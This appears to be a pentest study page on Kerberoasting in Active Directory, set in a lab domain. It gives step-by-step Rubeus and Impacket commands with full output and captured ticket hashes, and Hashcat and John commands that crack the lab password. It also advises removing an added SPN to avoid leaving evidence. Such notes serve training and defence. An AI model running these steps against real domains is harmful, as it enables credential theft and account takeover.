---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Kerberoasting

[**Kerberoasting**](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) is conceptually similar to [AS-REP Roasting](as-rep-roasting.md) except it attacks a `TGS-REP` ticket. Recall from [earlier](../#operation-details) the steps of authenticating to a service via Kerberos:

1. A user authenticates to the domain and receives a TGT (encrypted with the user's password)
2. The user uses their TGT to request a service ticket (`TGS-REQ`) from the domain controller (TGS)
   * Services are requested by SPN in the form `spn/host`
3. TGS issues a `TGS-REP` which is _encrypted with the password hash of the target service_ using the highest level of encryption both the service account and the client support
   * The "highest level of encryption" is based on the [`msDs-SupportedEncryptionTypes`](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) property of the service and client accounts.
4. User submits the `TGS-REP` to the service and is granted access

If an attacker has a valid TGT (e.g. if they have access to a compromised account), they can submit a `TGS-REQ` and get a valid `TGS-REP`. This can then be cracked offline.

This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN _runs in the context of a computer account, a managed service account, or a group-managed service account_, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the `krbtgt` user account which acts as service account for the KDC. Therefore, the chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.

If a user has `GenericWrite` or `GenericAll` permissions on another AD user account.they could reset the user's password, though this may raise suspicion. Alternatively, with the same permissions, an attacker could [set an SPN](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) for the user, kerberoast the account, and crack the password hash in an attack named **targeted Kerberoasting**. After cracking one should remove the added SPN to avoid leaving evidence or potential vulnerabilites that could be exploited by someone else.

## Obtaining the Hash

### Rubeus

Much as Rubeus [can be used](as-rep-roasting.md#rubeus) for AS-REP Roasting it can be used for Kerberoasting with the `kerberoast` command:

```sh
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast
```

* `/tgtdelg` is Rubeus's implementation of [Kekeo's tgtdeleg](https://github.com/gentilkiwi/kekeo/blob/4fbb44ec54ff093ae0fbe4471de19681a8e71a86/kekeo/modules/kuhl\_m\_tgt.c#L189-L327) trick
  * It uses the Kerberos GSS-API to request a “fake” delegation for a target SPN that has unconstrained delegation enabled. This approach allows attackers to extract a usable TGT for the current user, including the session key.
  * As described in this [blog post](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/) (also linked above) this basically has the effect of allowing the attacker to artificially lower the "highest supported encryption level." This sets the `msDs-SupportedEncryptionTypes` to 23 which forces it to RC4. RC4 is much easier to crack than AES
* `/outfile` tells the tool to place the hashes in an output file named `hashes.kerberoast`

When run it find the `iis_service` account is vulnerable to Kerberoasting and it places the hash in the specified file:

```shell-session
C:\Users\jeff>.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target Domain          : corp.com
[+] Ticket successfully imported!
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\jeff\hashes.kerberoast

[*] Roasted hashes written to : C:\Users\jeff\hashes.kerberoast
```

{% code title="hashes.kerberoast" %}
```
$krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.com*$64D1A55106B4538945E7188C3E8803AE$5931D4016562A8EA1C8AA0AF9E88BC3B55285B40D027073F7E5F5051E720192E063503FA74E12690CEF29E947B544A91775F6EC4196854B74FB617B8564CD17FA9D21D2DD8798322E23A69037A7BF9DCC54456CAE0A0FC61E4A32300263E7D0304E148E8045BBEFED70EF6788D4C1CF92F3E848D60DE37474423BE991E6B6C863413695A203C7128AE659F8BD4DA3FA333A078C18A1097D68A81124EBFA4CAF1DC10D0A6E1B926E57BF0108215EEF6C94B57B6640C934651ACFFD93E85C9B22E1CB23CE4ACEE97B21A278F990FEE6D06B55EC2A6FD087C99A5D774191B167FDB0841E7BF3F674900AD965A027CFF58AC44FE6BB9759027C80917E41150DA3FC8637B939FD6B4CB6168A0692AD728B3BBE39FCBBEF2F0DA275A566F3D115F40799056DF1DBC4E2604A69ADA77F38DEB69687DBBCA705CEEC49A15C9C691D8BBB849EF98BD721E09A99BB9EE213D61BA2F675ED1A74CFC659A2E8A1BC332D19152A91C4749339D43797225845F54ECDFEF7F650B009DAE3AE9635E2B87F5A34C4A353495EAEA184D9C00FD0B9AEEBA1E877AB513A53F736A107C5DCA99FE4C634C4D788C65A4BD7FC854C93E6BC3B6A08F28D9362159FDFEB4021A549F2D8968A9155DCB970B0BF6DD514A0F70ECAAFCB4C23333DAD706A199F5B07282B2FA3DA4B64181BA32182960963CC272F3092FC157014705A1DF80AD9534CC794E2743CF6FF97525F68BC0D3C4E376B6A3437D310A2EA4478F926D1BE4FC42AA72D9068515539735A295B236785952199C8D2F0925D795BC867CD0CE22CCD924BE7AC5CEF0667F6AE29466814A91C31606F69A4BDFA8679005B25F139D900EC54B254B7F777F7CD1965368A38FC4331F47F69A72BF87EDD5F85C45A6080D260E8ABD96522BA58D824B8CADE1BABC7946FC418C3CE10DF82E4B1602E70823611227278A6305320CC361A41183C193056069C601C0B2AC2B8C8CE964CD6B9A172B786DB72345D7D485368CBCB5F4B8C7484DA3A19B9A1918D5EEC4655D0B469898300BB54FF6EE984BE20CEF5D8334D9A8A1D228B3FD14DF3ABFF4EF70725A4A3F39FB00AF4B06A3CB66E913D3150FBF334380364886ACD9D4334DB358310DC0DF9C33944325D192E9A2B2BCD2E92E04669F8E062ECDB222651A9FBD83CA23F04FDA4D70096CEC6A133F8DF33711E32E966A2839F32611CA99993F5EE689D08D2F9C8E77F7F59FF975C1F6E1CBE36B72EEF3E4C16147225B27B873F7468F82235B1640722EF8F40CCED6E044B28DAD58352A84818D43FCEA223242D70CD3C8AF30575A393481610F876697E10B3FEB97EA6E
```
{% endcode %}

Note in the hash that type is set to 23 (`$23` second field) indicating the `/tgtdeleg` trick was successful in getting it down to RC4.

### Impacket

[Impacket](as-rep-roasting.md#impacket) also offers a [`GetUserSPNs`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) script which can be used to obtain a TGS-REP. The command to obtain a ticket with this tool is:

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/jeff
```

* `-request` is used to request the ticket and output it in a usable format
* `-dc-ip` specifies the domain controller's IP
* `corp.com/jeff` is the user that the attacker has access to and can authenticate as to obtain a valid TGT

When run it reveals the same hash as found via Rubeus:

```shell-session
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.192.70 corp.com/jeff
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  --------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com:80  iis_service            2022-09-07 06:38:43.411468  2023-03-01 04:40:02.088156  unconstrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$64D1A55106B4538945E7188C3E8803AE$5dba896074545add30be52e021954d21da4cc262882cceaeb19208be7234541db8a59a09fd90dc2c291289b2b33f539413fbe7d3bcc2100ab1e0b60dd833ef7b2579b5872b3c99ca7435cf9de4fffd8ad0bc23f4f8158636886f4d06e039adef7999f807fec8d33aeddc72ce8f69717d6d89b20ef1aa55438da1e1783702227d573b4084dc1ef01a0517b07ce894362049931649474dd1c3171e8c450522868b47e1da3f7aea559ab6cfffd07f495ed3ccf62238cf7b2e1edf11dd60c98880d1a96509ad0187f313914981cd45d31ea66a13172feee2150111d519669c77164f144587e239013e6e568dc0f6b804dda767a0317d5b3a25bd23806bb79cd8ab7d7bf50a47964aebe598bb83be8225c962e5ce45a3eae86fea2899fb33c02fce77a75aaac5780277cd43c75a8df26508539475c09bbb11fa79316c38d4abbc6dba7b1d65bf15b23f1a304baf0e0837187716506ecb8bd111966128a44c8d425e74bca631a4c5f452867b28cfd6e9f396c8bbec1639b55e4833e43cdcca3038cc15ed4120ba2b0342466b2c3e8cd9dedbb0d40c8174f9201032c341b6e186777fe0f441157ad195acdd572e0c87e93e8c05526bc4cfca65ac585b54e5475d44b91b36b8300f7982a365cacc8dd2d41922096638d8fc4a4cbe6a8d0d5d0680dd5184622859670a2cfdf20b0b585983c3957e6c146042e7a5d4f8a06d3728373328188bc25440016e89a2ea962da7632a359b14480c7fc936f6c5acd5f103008bda8641da148f500090a1ac8a7a77c88aa6aabfb4f1c220a9740e2fa58614e0e1f60915d1832681795c176c7e9b8942e3ee281767fed68ac6630d3a7750f9c43ce5797228eab928821d58bcab6a98fd29ccaa80ca47f1bba567e67dd67fceb2727be2512d78dba03e0ec346a70a60ff24d405fe89a80f969073067bb660fedae41c0e6e971b136cf537b7c62dc1e6f4935b3c415db98c5649d87e694ee04381fe7820b323235a7c508945ad2ae188149d06fd0ef8bdb9f0cc3594b0dc666b9329409827d5facc792280411827d0f35e87124f7d51042a9c9d8915174814329ffba6526718b1b418bc5c0ae17b3705aa1b2faff6ba4a9a578d90f33588520857aa6227a7e04332adc3021a56df153ac03cfd1ae8ab3c89e63fc78694115242d8474fdd6bf68b8df059b2f5b5ef0344f554dbd903587319d991a1da53f13ac4c8091483269ee1f29c19b7791bbd52cdb9284eb492686195d90a05557e7041a9c817e44991977f5d9b2e20659f2664ad5b2123ba7951971183aee20cdc3b6e6d220c9e6f4296330f9a17a676412495e293
```

Note that Impacket has both an upside and downside. The upside is it can be run from an attacker's Kali machine. The downside is that it does not offer the same TGT delegation feature as Rubeus (`/tgtdelg`) allowing the attacker to get a TGS-REP encrypted with the weaker RC4. In this instance it does not matter because the example was set up to be easy but in the real world the `/tgtdeleg` flag can be the difference between obtaining a crackable or uncrackable hash.

#### Time Synchronization

If `impacket-GetUserSPNs` throws the error "`KRB_AP_ERR_SKEW(Clock skew too great)`" the attacker needs to synchronize the time of their Kali machine with the domain controller. This can be done using [`ntpdate`](https://linux.die.net/man/8/ntpdate) or [`rdate`](https://linux.die.net/man/1/rdate).

## Cracking the Hash

Cracking can often be achieved with either [John The Ripper](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-with-account/kerberoast-attack) (JtR) or Hashcat. This is helpful because JtR has been found to generally perform better on CPUs whereas Hashcat is superior on GPUs. So depending on the attacker's system the better-suited tool can be chosen.

### Hashcat

Once again, Hashcat can be used to crack the hash. To find the mode keep in mind that the attacker has obtained a TGS-REP with encryption type 23:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~$ hashcat --help | grep Kerberos
</strong>  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
</code></pre>

With that information in mind, `13100` seems to be the proper attack mode. The hash will be cracked with the command:

{% code overflow="wrap" %}
```bash
hashcat -m 13100 -r /usr/share/hashcat/rules/best64.rule -o cracked.kerberoast hashes.kerberoast /usr/share/wordlists/rockyou.txt
```
{% endcode %}

As seen in the output below it reveals the `iis_service` password to be `Strawberry1`:

```shell-session
kali@kali:~$ hashcat -m 13100 -r /usr/share/hashcat/rules/best64.rule -o cracked.kerberoast hashes.kerberoast /usr/share/wordlists/rockyou.txt        
hashcat (v6.2.6) starting

...
                                                       
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.c...97ea6e
...
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
...
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

{% code title="cracked.kerberoast" overflow="wrap" %}
```
$krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.com*$64d1a5...b97ea6e:Strawberry1
```
{% endcode %}

### John The Ripper



To crack the same hashes.kerberoast file with the best64 ruleset the command would be:

{% code overflow="wrap" %}
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.kerberoast
```
{% endcode %}

Then the passwords can be viewed with the --show flag:

```bash
john --show hashes.kerberoast
```
